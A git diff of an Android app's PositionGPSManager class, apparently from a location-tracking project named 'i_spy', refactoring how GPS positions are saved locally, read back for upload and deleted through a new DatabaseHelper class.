@@ -6,7 +6,7 @@ import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 
 import com.um.asn.i_spy.Config;
-import com.um.asn.i_spy.entities.PositionGPSEntity;
+import com.um.asn.i_spy.database_helper.DatabaseHelper;
 import com.um.asn.i_spy.http_methods.HttpPostTask;
 import com.um.asn.i_spy.listeners.GPSListener;
 import com.um.asn.i_spy.models.Phone;
@@ -103,18 +103,18 @@ public class PositionGPSManager {
     }
 
     public void insertLocal() {
-        PositionGPSEntity myBD = new PositionGPSEntity(this.context, PositionGPSEntity.POSITION_GPS_COLUMN_ID, null, 1);
-        myBD.insert(this.positions.get(0));
-        System.out.println("Position saved local (" + myBD.getAll().size() + ")");
+        DatabaseHelper myBD = new DatabaseHelper(this.context);
+        myBD.insertPositionGPS(this.positions.get(0));
+        System.out.println("Position saved local (" + myBD.getAllPositionGPS().size() + ")");
     }
 
     public void insertDistFromLocal() {
-        PositionGPSEntity myBD = new PositionGPSEntity(this.context, PositionGPSEntity.POSITION_GPS_COLUMN_ID, null, 1);
-        this.positions = myBD.getAll();
+        DatabaseHelper myBD = new DatabaseHelper(this.context);
+        this.positions = myBD.getAllPositionGPS();
         System.out.println("getAll size : " + this.positions.size());
 
         insert();
-        myBD.deleteAll();
+        myBD.deleteAllPositionGPS();
     }
 
 }
